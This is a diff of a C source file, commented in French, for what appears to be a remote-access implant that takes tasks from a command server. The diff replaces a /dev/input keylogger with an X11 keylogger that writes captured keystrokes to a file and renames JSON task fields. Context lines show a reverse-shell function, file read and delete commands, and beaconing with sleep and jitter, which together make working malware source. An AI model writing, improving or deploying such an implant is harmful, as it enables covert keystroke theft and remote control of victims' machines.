@@ -9,20 +9,22 @@
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <limits.h> // Pour PATH_MAX
+#include <limits.h>
 #include <fcntl.h>
 #include <signal.h>
 #include <dirent.h>
-#include <linux/input.h> // Pour le keylogger
-#include <pthread.h>     // Pour les threads
-#include <pwd.h>         // Pour getpwuid
-#include <ctype.h>       // Ajout pour isdigit
+#include <pthread.h>
+#include <pwd.h>
+#include <ctype.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
 
-// Variables globales pour le keylogger
-static int keylogger_fd = -1;         // Descripteur de fichier pour /dev/input
-static FILE *keylogger_file = NULL;   // Fichier de sortie
-static pthread_t keylogger_thread;    // Thread pour capturer les frappes
-static int keylogger_running = 0;     // Indicateur d’état
+// Variables globales pour le keylogger X11
+static Display *display = NULL;
+static Window root_window;
+static FILE *keylogger_file = NULL;
+static pthread_t keylogger_thread;
+static int keylogger_running = 0;
 
 // Callback pour récupérer la réponse HTTP
 size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
@@ -31,10 +33,10 @@ size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
     return realsize;
 }
 
-// Fonction pour nettoyer une chaîne (remplacer les retours à la ligne par des espaces)
+// Fonction pour nettoyer une chaîne (remplacer les retours à la ligne et caractères problématiques)
 void clean_string(char *str) {
     for (size_t i = 0; str[i] != '\0'; i++) {
-        if (str[i] == '\n' || str[i] == '\r') {
+        if (str[i] < 32 || str[i] > 126) { // Remplace tout caractère non imprimable ou non-ASCII
             str[i] = ' ';
         }
     }
@@ -111,16 +113,14 @@ char *read_file(const char *filepath) {
     return strdup(buffer);
 }
 
-// Fonction pour lister les processus en lisant /proc
+// Fonction pour lister les processus uniques (nom uniquement, sans doublons)
 char *list_processes() {
     DIR *dir;
     struct dirent *entry;
     char buffer[8192] = {0};
     size_t offset = 0;
-
-    // En-tête similaire à ps aux
-    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
-                      "USER       PID %%CPU %%MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n");
+    char seen[256][256] = {0}; // Tableau pour suivre les noms déjà vus (max 256 processus uniques)
+    int seen_count = 0;
 
     dir = opendir("/proc");
     if (!dir) {
@@ -128,102 +128,46 @@ char *list_processes() {
     }
 
     while ((entry = readdir(dir)) != NULL) {
-        // Vérifie si l'entrée est un PID (numérique)
-        if (!isdigit(*entry->d_name)) {
-            continue;
-        }
+        if (!isdigit(*entry->d_name)) continue;
 
         char path[PATH_MAX];
         char line[1024];
         FILE *fp;
-        pid_t pid = atoi(entry->d_name);
         char comm[256] = {0};
-        char state = ' ';
-        long utime = 0, stime = 0;
-        unsigned long vsize = 0, rss = 0;
-        char tty[32] = "?";
-        char start[16] = "00:00";
-        char user[32] = "unknown";
 
-        // Lecture du fichier stat
         snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
         fp = fopen(path, "r");
         if (fp) {
             if (fgets(line, sizeof(line), fp)) {
-                char *p = line;
-                int field = 0;
-                while (field < 23 && p) {
-                    if (field == 2) state = p[1];  // État du processus
-                    if (field == 13) utime = atol(p);  // Temps utilisateur
-                    if (field == 14) stime = atol(p);  // Temps système
-                    if (field == 23) vsize = atol(p);  // Taille virtuelle
-                    if (field == 24) rss = atol(p);    // Mémoire résidente
-                    p = strchr(p, ' ');
-                    if (p) p++;
-                    field++;
-                }
+                sscanf(line, "%*d (%255[^)])", comm);
+                clean_string(comm); // Nettoyer le nom pour éviter les caractères problématiques
             }
             fclose(fp);
         }
 
-        // Lecture du nom de la commande
-        snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
-        fp = fopen(path, "r");
-        if (fp) {
-            fgets(comm, sizeof(comm), fp);
-            comm[strcspn(comm, "\n")] = 0;  // Supprime le retour à la ligne
-            fclose(fp);
-        }
-
-        // Obtention du TTY
-        snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
-        fp = fopen(path, "r");
-        if (fp) {
-            if (fgets(line, sizeof(line), fp)) {
-                int tty_nr;
-                sscanf(line, "%*d %*s %*c %*d %*d %*d %d", &tty_nr);
-                if (tty_nr != 0) {
-                    snprintf(tty, sizeof(tty), "tty%d", tty_nr);
-                }
-            }
-            fclose(fp);
-        }
-
-        // Obtention de l'utilisateur
-        struct stat statbuf;
-        snprintf(path, sizeof(path), "/proc/%s", entry->d_name);
-        if (stat(path, &statbuf) == 0) {
-            struct passwd *pw = getpwuid(statbuf.st_uid);
-            if (pw) {
-                strncpy(user, pw->pw_name, sizeof(user) - 1);
-                user[sizeof(user) - 1] = '\0';
+        // Vérifier si le nom est déjà vu
+        int is_duplicate = 0;
+        for (int i = 0; i < seen_count; i++) {
+            if (strcmp(seen[i], comm) == 0) {
+                is_duplicate = 1;
+                break;
             }
         }
 
-        // Calcul du temps CPU (approximation)
-        long total_time = (utime + stime) / sysconf(_SC_CLK_TCK);
-        long minutes = total_time / 60;
-        long seconds = total_time % 60;
-        char time_str[32];  // Augmenté de 16 à 32 pour éviter la troncature
-        snprintf(time_str, sizeof(time_str), "%ld:%02ld", minutes, seconds);
+        // Ajouter le nom s'il n'est pas déjà vu
+        if (!is_duplicate && seen_count < 256) {
+            strncpy(seen[seen_count], comm, sizeof(seen[seen_count]) - 1);
+            seen[seen_count][sizeof(seen[seen_count]) - 1] = '\0';
+            seen_count++;
 
-        // Approximation %CPU et %MEM (simplifiée)
-        float cpu_percent = 0.0;  // À améliorer avec des données système globales
-        float mem_percent = (rss * sysconf(_SC_PAGESIZE)) / (float)sysconf(_SC_PHYS_PAGES) * 100;
-
-        // Ajout de la ligne au buffer
-        offset += snprintf(buffer + offset, sizeof(buffer) - offset,
-                          "%-8s %5d %4.1f %4.1f %6lu %5lu %-7s %c    %5s %7s %s\n",
-                          user, pid, cpu_percent, mem_percent, vsize, rss, tty,
-                          state, start, time_str, comm);
-
-        if (offset >= sizeof(buffer) - 256) {
-            break;  // Prévenir débordement
+            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s\n", comm);
+            if (offset >= sizeof(buffer) - 256) break; // Prévenir le dépassement
         }
     }
 
     closedir(dir);
     clean_string(buffer);
+    printf("Taille de la sortie PS : %zu octets\n", strlen(buffer));
     return strdup(buffer);
 }
 
@@ -232,7 +176,6 @@ char *list_sockets() {
     char buffer[8192] = {0};
     size_t offset = 0;
 
-    // Lister les sockets TCP
     FILE *tcp_file = fopen("/proc/net/tcp", "r");
     if (tcp_file) {
         char line[256];
@@ -264,7 +207,6 @@ char *list_sockets() {
         offset += snprintf(buffer + offset, sizeof(buffer) - offset, "Erreur : impossible d'ouvrir /proc/net/tcp\n");
     }
 
-    // Lister les sockets UDP
     FILE *udp_file = fopen("/proc/net/udp", "r");
     if (udp_file) {
         char line[256];
@@ -368,14 +310,16 @@ char *send_reverse_shell(const char *lhost, int lport) {
     return strdup("Reverse shell envoyé");
 }
 
-// Fonction exécutée par le thread pour capturer les frappes
-void *keylogger_loop(void *arg) {
-    struct input_event ev;
+// Fonction exécutée par le thread pour capturer les frappes via X11
+void *keylogger_x11_loop(void *arg) {
+    FILE *keylogger_file = (FILE *)arg;
+    XEvent ev;
     while (keylogger_running) {
-        ssize_t n = read(keylogger_fd, &ev, sizeof(ev));
-        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) { // Touche pressée
+        XNextEvent(display, &ev);
+        if (ev.type == KeyPress) {
+            KeySym keysym = XLookupKeysym(&ev.xkey, 0);
             if (keylogger_file) {
-                fprintf(keylogger_file, "Key: %d\n", ev.code);
+                fprintf(keylogger_file, "Key: %lu\n", keysym);
                 fflush(keylogger_file);
             }
         }
@@ -383,7 +327,7 @@ void *keylogger_loop(void *arg) {
     return NULL;
 }
 
-// Fonction pour activer/désactiver le keylogger
+// Fonction pour activer/désactiver le keylogger X11
 char *toggle_keylogger(const char *state, const char *filepath) {
     if (!state) {
         return strdup("Erreur : état du keylogger non spécifié");
@@ -394,60 +338,56 @@ char *toggle_keylogger(const char *state, const char *filepath) {
             return strdup("Keylogger déjà activé");
         }
 
-        // Ouvre le périphérique d’entrée (ajustez "event0" selon votre système)
-        keylogger_fd = open("/dev/input/event0", O_RDONLY);
-        if (keylogger_fd < 0) {
-            return strdup("Erreur : impossible d'ouvrir /dev/input (permissions root requises ?)");
+        // Initialisation X11
+        display = XOpenDisplay(NULL);
+        if (!display) {
+            return strdup("Erreur : impossible d'ouvrir le display X11 (environnement graphique requis)");
         }
+        root_window = DefaultRootWindow(display);
+        XSelectInput(display, root_window, KeyPressMask);
 
         // Ouvre le fichier de sortie si spécifié
         if (filepath && strcmp(filepath, "null") != 0) {
             keylogger_file = fopen(filepath, "a");
             if (!keylogger_file) {
-                close(keylogger_fd);
+                XCloseDisplay(display);
                 return strdup("Erreur : impossible d'ouvrir le fichier de sortie");
             }
         }
 
-        // Démarre le thread
         keylogger_running = 1;
-        if (pthread_create(&keylogger_thread, NULL, keylogger_loop, NULL) != 0) {
+        if (pthread_create(&keylogger_thread, NULL, keylogger_x11_loop, keylogger_file) != 0) {
             keylogger_running = 0;
             if (keylogger_file) fclose(keylogger_file);
-            close(keylogger_fd);
+            XCloseDisplay(display);
             return strdup("Erreur : échec de la création du thread");
         }
 
         char msg[256];
-        if (filepath && strcmp(filepath, "null") != 0) {
-            snprintf(msg, sizeof(msg), "Keylogger activé, écriture dans %s", filepath);
-            return strdup(msg);
-        }
-        return strdup("Keylogger activé");
+        snprintf(msg, sizeof(msg), "Keylogger X11 activé%s%s",
+                 filepath && strcmp(filepath, "null") != 0 ? ", écriture dans " : "",
+                 filepath && strcmp(filepath, "null") != 0 ? filepath : "");
+        return strdup(msg);
     }
     else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
         if (!keylogger_running) {
             return strdup("Keylogger déjà désactivé");
         }
 
-        // Arrête le thread
         keylogger_running = 0;
         pthread_join(keylogger_thread, NULL);
-
-        // Ferme les ressources
         if (keylogger_file) {
             fclose(keylogger_file);
             keylogger_file = NULL;
         }
-        if (keylogger_fd >= 0) {
-            close(keylogger_fd);
-            keylogger_fd = -1;
+        if (display) {
+            XCloseDisplay(display);
+            display = NULL;
         }
-
         return strdup("Keylogger désactivé");
     }
 
-    return strdup("Erreur : état du keylogger invalide (doit être 'true'/'false' ou 'on'/'off')");
+    return strdup("Erreur : état invalide (doit être 'true'/'false' ou 'on'/'off')");
 }
 
 // Fonction pour obtenir le chemin absolu de l'exécutable actuel
@@ -457,7 +397,7 @@ char *get_executable_path() {
     if (count == -1) {
         return strdup("Erreur : impossible de récupérer le chemin de l'exécutable");
     }
-    path[count] = '\0'; // Terminer la chaîne
+    path[count] = '\0';
     return strdup(path);
 }
 
@@ -676,7 +616,7 @@ int main() {
             }
             else if (json_object_object_get_ex(action_field, "SLEEP", &sleep_field)) {
                 struct json_object *seconds_field, *jitter_field;
-                if (json_object_object_get_ex(sleep_field, "seconds", &seconds_field)) {
+                if (json_object_object_get_ex(sleep_field, "time", &seconds_field)) {
                     sleep_time = json_object_get_int(seconds_field);
                 }
                 if (json_object_object_get_ex(sleep_field, "jitter", &jitter_field)) {
@@ -732,7 +672,7 @@ int main() {
             else if (json_object_object_get_ex(action_field, "CAT", &cat_field)) {
                 struct json_object *filepath_field;
                 const char *filepath = NULL;
-                if (json_object_object_get_ex(cat_field, "filepath", &filepath_field)) {
+                if (json_object_object_get_ex(cat_field, "path", &filepath_field)) {
                     filepath = json_object_get_string(filepath_field);
                 }
                 if (!filepath || strcmp(filepath, "null") == 0) {
@@ -761,7 +701,7 @@ int main() {
             else if (json_object_object_get_ex(action_field, "RM", &rm_field)) {
                 struct json_object *filepath_field;
                 const char *filepath = NULL;
-                if (json_object_object_get_ex(rm_field, "filepath", &filepath_field)) {
+                if (json_object_object_get_ex(rm_field, "path", &filepath_field)) {
                     filepath = json_object_get_string(filepath_field);
                 }
                 if (!filepath || strcmp(filepath, "null") == 0) {
@@ -795,11 +735,14 @@ int main() {
                     continue;
                 }
 
+                // Nettoyer la chaîne encodée pour éviter les caractères invalides
+                clean_string(encoded_result);
+
                 memset(json, 0, sizeof(json));
                 snprintf(json, sizeof(json),
                          "{\"RESULT\":{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"%s\"}}",
                          implant_uid, task_uid, encoded_result);
-                free(encoded_result);
+                printf("JSON RESULT envoyé : %s\n", json);
 
                 memset(response, 0, sizeof(response));
                 curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
@@ -811,6 +754,7 @@ int main() {
                     printf("Réponse RESULT : %s\n", response);
                 }
 
+                free(encoded_result);
                 free(result);
                 free(task_uid);
             }
